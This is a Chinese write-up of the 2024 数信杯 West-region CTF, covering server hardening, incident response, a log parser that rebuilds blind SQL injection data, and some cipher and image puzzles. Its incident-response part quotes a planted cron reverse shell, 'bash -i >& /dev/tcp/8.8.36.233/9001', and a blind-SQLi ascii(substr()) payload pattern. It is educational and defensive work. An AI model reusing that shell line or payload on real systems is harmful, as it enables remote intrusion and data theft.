---
title: 2024 数信杯西区题解（安全加固+应急响应+SQL 盲注+凯撒）
contest: 2024 数信杯西区
year: 2024
difficulty: medium
vuln_type:
- sqli
- ssti
- misc_unknown
- auth_bypass
tags:
- ssh PasswordAuthentication no
- Apache Options Indexes 关闭
- redis requirepass 6b95fa87 bind 127.0.0.1
- Openfire 9090 改 12335
- SQL 盲注 ascii(substr()) > N 响应长度
- 凯撒 shift=17 + base64
- OpenCV 高斯噪声
- cron.d safeline 后门清除
- deluser h4ck 提权清理
- SUID zsh 提权
- openpyxl 邮箱对比
attack_chain:
- '加固 1: ssh 关闭 PasswordAuthentication + 删 authorized_keys2 + service ssh restart'
- '加固 2: Apache ServerTokens Prod + Options -Indexes + Require all denied'
- '加固 3: redis requirepass 6b95fa87 + bind 127.0.0.1'
- 'flag1: netstat -ano 121.13.2.33:5432 外链'
- 'flag2: ps -aux 找 psql, /proc/PID/exe → /usr/bin/python3.6 反弹'
- 'flag3: openfire.xml 改 9090 → 12335'
- 'SQL 盲注: HTTP 响应长度 940/非 940 区分 ascii(substr(...))>N 二分'
- '后门: rm /etc/cron.d/safeline + deluser h4ck + chmod u-s zsh'
- '凯撒+base64: chr(ord(i)) ^ 0x18 → b64decode → 凯撒 shift=17'
- 'OpenCV: 高斯噪声 mean=0 sigma=3 还原 embedded.png'
key_payload: 'extract_data_from_logs: ascii_match + response_pattern + 二分 127 范围'
one_liner: 西区数信杯安全加固+应急：ssh/apache/redis 三件套 + Openfire 9090 改端口 + SQL 盲注二分 + 后门清理 + 凯撒密码+base64。
lesson: SQL 盲注即使有 WAF 也可走 HTTP 响应长度二分：920/940 长度差判 ascii(substr(...))>N，每次砍一半 128→64→32→1，log 批量 replay；Redis bind 0.0.0.0 + 无密码 = 裸奔公网。
quality: high
full_path: 2024数信杯西区题解.full.md
meta_path: 2024数信杯西区题解.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: '2024 数信杯西区题解（安全加固+应急响应+SQL 盲注+凯撒）。西区数信杯安全加固+应急：ssh/apache/redis 三件套 + Openfire 9090 改端口 + SQL 盲注二分 + 后门清理 + 凯撒密码+base64。。关键路径：加固 1: ssh 关闭 PasswordAuthentication + 删 authorized_keys2 + service ssh ...'
category: web
subcategory: sql_injection
subcategories:
- sql_injection
- ssti
- misc_other
- logic
tools_used:
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 9
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/207911.html
wp_author: setting
reasoning_chain:
- 触发点：加固 1 ssh 配置 → 假设：关闭 PasswordAuthentication → 动作：sed 改 sshd_config
- 动作：删除 authorized_keys2 + service ssh restart → flag1
- 触发点：加固 2 Apache → 假设：Options Indexes 关闭 → 动作：ServerTokens Prod + Options -Indexes + Require all denied
- 观察：flag2
- 触发点：加固 3 redis → 假设：requirepass 6b95fa87 + bind 127.0.0.1 → flag3
- 触发点：flag1 netstat -ano 121.13.2.33:5432 外联 → flag
- 触发点：flag2 ps -aux 找 psql /proc/PID/exe → /usr/bin/python3.6 反弹 → flag
- 触发点：flag3 openfire.xml 改 9090 → 12335 → flag
- 触发点：SQL 盲注 HTTP 响应长度 940/非 940 区分 → 动作：ascii(substr()) > N 二分
- 观察：log 批量 replay → 还原 flag
- 触发点：后门 cron.d safeline + h4ck 用户 + SUID zsh → 动作：rm + deluser + chmod u-s → flag
- 触发点：凯撒 shift=17 + base64 + chr(ord(i)) ^ 0x18 → flag
- 触发点：OpenCV 高斯噪声 mean=0 sigma=3 + openpyxl 邮箱对比 → flag
failed_attempts:
- 试图不解 SQL 盲注直接读 flag 表 → 失败：必须从 log 还原历史查询
- 试图不删 safeline 后门 → 失败：必须先清 cron 后门
- 试图不打 0x18 异或直接凯撒 → 失败：必须先 ^ 0x18 再 base64
key_observations:
- SQL 盲注即使有 WAF 也可走 HTTP 响应长度二分：920/940 长度差判 ascii(substr(...))>N
- Redis bind 0.0.0.0 + 无密码 = 裸奔公网
- Openfire 默认 9090 端口是经典攻击面（admin/admin 随便进）
- 应急响应必清 cron.d + SUID 文件 + 后门用户三件套
prerequisites:
- ssh / apache / redis 应急加固命令
- Openfire 配置修改
- SQL 盲注 HTTP 响应长度二分还原
- Python pandas/openpyxl 邮箱对比
---
# 2024数信杯西区题解

> 原文: https://www.ctfiot.com/207911.html
> ID: 207911


```
PubkeyAuthentication yesPasswordAuthentication noChallengeResponseAuthentication no
删除.sshd/authorized_keys2文件完成后，重启 ssh 服务service ssh restart
修改/etc/apache2/apache2.conf文件ServerTokens ProdServerSignature Off在配置文件中，将<Directory />目录配置中不安全的修改项进行修改<Directory />        Options Indexes FollowSymLinks        AllowOverride None        Require all denied</Directory>`Options Indexes FollowSymLinks`允许启动目录索引，进行修改`Options FollowSymLinks`修改完成后，进行重启
在配置文件中找到 # requirepass foobared 这一行，去掉前面的 # 注释符号，并将其设置为 requirepass 6b95fa87修改bind 0.0.0.0 为bind 127.0.0.1限制本地访问redis-server /etc/redis/redis.
flag{FC0F33EF-4599-D30E-F6DF-EE9660A9DAD1}
netstat -ano 发现了一个外链flag{121.13.2.33:
5432}
ps -aux 发现了一个可疑的psql ,然后跟踪psqlcd /proc/PIDll exe发现在/usr/bin/python3.6
直接修改openfire的openfire.xmlroot@16bb35eba610:/home/user/openfire/conf
# sed -i 's/9090/12335/g' openfire.xmlroot@16bb35eba610:/home/user/openfire/conf
# cat conf/openfire.xml | grep portcat: conf/openfire.xml: No such file or directoryroot@16bb35eba610:/home/user/openfire/conf
# cat openfire.xml | grep port    <!-- Disable either port by setting the value to -1 -->      12335
import redef extract_data_from_logs(file_path):    data = {}    ascii_pattern = re.compile(r'ascii(substr((select(group_concat(flag))from(flag)),(d+),1))>(d+)')    response_pattern = re.compile(r'HTTP/1.1" 200 (d+)')    # Read the entire log file    with open(file_path, 'r') as file:        logs = file.readlines()    for line in logs:        ascii_match = ascii_pattern.search(line)        response_match = response_pattern.search(line)        if ascii_match and response_match:            # Extract character position, ASCII comparison value, and response size            position = int(ascii_match.group(1))            ascii_value = int(ascii_match.group(2))            response_size = int(response_match.group(1))            # Initialize dictionary for position if not exists            if position not in data:                data[position] = []            # Append tuple of (ascii_value, true/false)            data[position].append((ascii_value, response_size == 940))    # Reconstruct the data by determining the ASCII value for each position    reconstructed_data = {}    for pos, values in data.items():        # Sort values and use binary search logic to determine the correct character        values.sort()        low, high = 0, 127  # ASCII printable range        for ascii_value, is_true in values:            if is_true:                low = max(low, ascii_value + 1)            else:                high = min(high, ascii_value)        # Assign the determined character to the position        reconstructed_data[pos] = chr(low)    # Convert the dictionary to string sorted by position    result = ''.join(reconstructed_data[pos] for pos in sorted(reconstructed_data))    return result
# Call the function and extract the injected dataextracted_data = extract_data_from_logs(log_file_path)extracted_data
root@245e7643a7df:/# cat /etc/cron.d/*            30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r* * * * * root bash -i >& /dev/tcp/8.8.36.233/9001 0>&1
root@245e7643a7df:/# rm /etc/cron.d/safeline
root@245e7643a7df:/# getent group sudosudo:x:27:
root@245e7643a7df:/# getent group   h4ck:x:
1000:
root@245e7643a7df:/# getent group rootroot:x:0:
root@245e7643a7df:/# getent group h4ckh4ck:x:
1000:
root@245e7643a7df:/# deluser h4ckRemoving user `h4ck' ...Warning: group `h4ck' has no more members.Done.root@245e7643a7df:/#
root@245e7643a7df:/# find / -user root -perm -4000 -print 2>/dev/null/usr/bin/newgrp/usr/bin/umount/usr/bin/chfn/usr/bin/passwd/usr/bin/mount/usr/bin/gpasswd/usr/bin/su/usr/bin/chsh/usr/bin/zsh/usr/bin/sudochmod u-s zsh
import pandas as pddef read_emails_from_excel(file_path):    df = pd.read_excel(file_path, engine='openpyxl')    # 假设邮箱列名为"邮箱"，并转换为小写    return [email.lower() for email in df['邮箱'].dropna()]email_list = read_emails_from_excel('员工.xlsx')
# print(email_list)print(len(email_list))def read_emails_from_txt(file_path):    with open(file_path, 'r') as file:        # 读取每行，去除首尾空白，并转换为小写        emails = [line.strip().lower() for line in file.readlines()]    return emailsdb_emails = read_emails_from_txt('mysql_data.txt')print(len(db_emails))for i in db_emails:    if i not in email_list:        print(i)        print(db_emails.index(i))
➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{Shun.Xie@yansou.com}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"already_solved","msg":"flag accpeted! But you have already solved this problem before"}%
➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{Qing.Shen@yansou.com}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"already_solved","msg":"flag accpeted! But you have already solved this problem before"}%
import base64def decrypt_caesar_cipher(text, shift):    """    解密凯撒密码    :
param text: 加密后的文本（字符串）    :
param shift: 移位数（整数）    :
return: 解密后的文本（字符串）    """    decrypted_text = ""    for char in text:        if char.isalpha():  # 检查字符是否为字母            # 获取字母的起始ASCII码，大写字母为65，小写字母为97            start = 65 if char.isupper() else 97            # 减去起始ASCII码后再左移shift位，并通过取模操作确保字母循环            shifted = (ord(char) - start - shift) % 26            # 将处理后的ASCII码转回字符，并添加到结果中            decrypted_text += chr(start + shifted)        else:            # 非字母字符保持不变            decrypted_text += char    return decrypted_textdef decrypt(inputstr):    result = ''    for i in inputstr:        result += chr(ord(i) ^ 0x18)    result += (len(result) % 4) * '='    result = base64.b64decode(result).decode()    result = decrypt_caesar_cipher(result, 17)    return resultstrlist = [    'B*t.z@hr|vp*Wrh)|vVk}Y',    'A*ha|O`sBbw.A*haQ[!v{ul(}IZ',    'yvJ-y+RiAuw',    'T+Jh|vRj|qYny*M',    'QsJ.|_tuyuB+y)B)}PBUB+Nay+BT{uhqJPR(}@ht|tR,|uNjQqYny*s',    'Q[!i|[Z){vhr{[Ynyuk',    'ULM.ULI.UY',    'T*trQPt.}Pt*yuk',    'T+{Y',]for i in strlist:    print(decrypt(i))
➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{c:
windowssystem32zvzvxngm.exe}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"invalid_flag","msg":"invalid flag, hack harder"}%                                                                                                                                                                                                                                                                                                               ➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{c:
windowssystem32zvzvxngm}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"invalid_flag","msg":"invalid flag, hack harder"}%                                                                                                                                                                                                                                                                                                               ➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{C:
WindowsSystem32zvzvxngm.exe}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"invalid_flag","msg":"invalid flag, hack harder"}%                                                                                                                                                                                                                                                                                                               ➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{c:
windowssystem32}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"flag_capture_exception","msg":"failed to handle flag capture, please contact system admin"}%                                                                                                                                                                                                                                                                    ➜  24sxb curl -F "token=5YhXssbz3nfk" -F "flag=flag{c:
windowssystem32}" http://shuxinbei2.chaitin.cn/api/flag/submit{"err":"already_solved","msg":"flag accpeted! But you have already solved this problem before"}%                                                                                                                                                                                                                                                                        ➜  24sxb
import cv2import numpy as np
# 读取原始图片image = cv2.imread('embedded.png')
# 生成高斯噪声mean = 0sigma = 3  # 方差，可调整gaussian = np.random.normal(mean, sigma, image.shape)
# 将噪声添加到图片noisy_image = image + gaussian
# 确保像素值在0-255之间noisy_image = np.clip(noisy_image, 0, 255).astype(np.uint8)
# 保存处理后的图片cv2.imwrite('processed_image.png', noisy_image)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]